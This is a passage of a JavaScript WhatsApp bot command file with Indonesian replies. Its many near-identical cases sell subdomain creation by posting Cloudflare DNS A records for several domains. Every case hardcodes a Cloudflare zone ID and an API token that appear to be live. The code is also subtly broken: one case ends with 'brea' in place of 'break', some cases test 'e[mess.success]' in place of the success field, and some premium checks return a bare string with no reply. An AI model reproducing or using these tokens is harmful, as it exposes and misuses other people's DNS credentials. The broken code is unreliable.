                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd69': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Owner")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2bc5ee0d4471aa74dd689c297c7aa43";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp";
               let tld = "panellofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case  'd48': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "128fe0f8f9f09ecce73e5c34c6a31444";
               let apitoken = "5Mp2HncEE28HzVOpjmvrM_vU1UuWPvGEhhbJ4h6-"
               let tld = "sellerpanell.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd49': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "bc4748bba0b75e8273b04c3dea2dc59c";
               let apitoken = "JKZrkLdzdd7hmT9XVcsXpoVsXmWQ61bQN6r2_oq-"
               let tld = "pannelkuu.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd80': {
if (!isPremium && !isOwner) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e60307683c18389584e9ae2f9fa707b2";
               let apitoken = "9hc8x5B4TewRTpXxETV_laVGksk3MyCfBXOgHgmg"
               let tld = "moon-offc.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ CH\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd79': {
if (!isPremium && !isOwner) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba364ec1df6998c10487aee2a61b7f0d";
               let apitoken = "hnM3i7bBHzcIRXqveYKR3KTnsfrkigkhar2vEUcP"
               let tld = "moon-offc.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd50': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b71e957f52cdf4160458e98174e5a0aa";
               let apitoken = "V8ittSBhlpwZ02t_zZ9YaQRo8Ptq-cdM1-3Lv-xs"
               let tld = "miha.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd70': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Owner")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "57671edad3d50d309860d91d25385e05";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp";
               let tld = "celiapanellstore.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'd71': {
    if (!isPremium) return reply("Fitur Ini Khusus Untuk Reseller Subdomain TamzDev\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Owner")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "034a5ceff63666337614606715f16e36";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "kayy.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e[mess.success]) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By TamzDev⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
case  'd51': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3f5d5b68ea37bf7b8a10a9a96b544622";
               let apitoken = "fTKJuqbdce2A-9oeoqhJ9vLfo-EUnLqCCz9OAmKG"
               let tld = "server-smtp1.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break   
case  'd82': {
if (!isPremium && !isOwner) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "31e4b7f518911c1f6cc86da36b25acee";
               let apitoken = "DsVfU8O-TfX_ss6x-bYnM2bm4ofzdtkJn-OyEkHF"
               let tld = "bekzpeler.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd81': {
if (!isPremium && !isOwner) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "685ed9b41b008d7d12d1965199734ca1";
               let apitoken = "DsVfU8O-TfX_ss6x-bYnM2bm4ofzdtkJn-OyEkHF"
               let tld = "bekzsukacoli.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = ϝαԃȥʋρɳ\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd52': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a0206c68c9b356bdf0a96fbb5d61fbdc";
               let apitoken = "8-zhtsEm27FKPsczF3ro2PipM9i1n8k2rzCyOmvj"
               let tld = "my-website.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd53': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80e208bb5900abc50d4483bdb8590d42";
               let apitoken = "3XpwIR878Fi0IoVyaJl1ggGgyJXuy_pB3g0M8pjz"
               let tld = "smtp1.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
brea

case  'd54': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3d253d788a5ed8fecddba97d3e52cf65";
               let apitoken = "_Y8BhYGmFb_aJEWHml7oQ2j70GPE6raCm_Ud99Yl";
               let tld = "mefahri.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case  'd56': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "583196d8ec9e16fbe5bbe944efbb3d8a";
               let apitoken = "jZ4EuzWs4-ktGcfkwht3NbZfGlZm_VnWjtYyG-1U";
               let tld = "mefahri.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
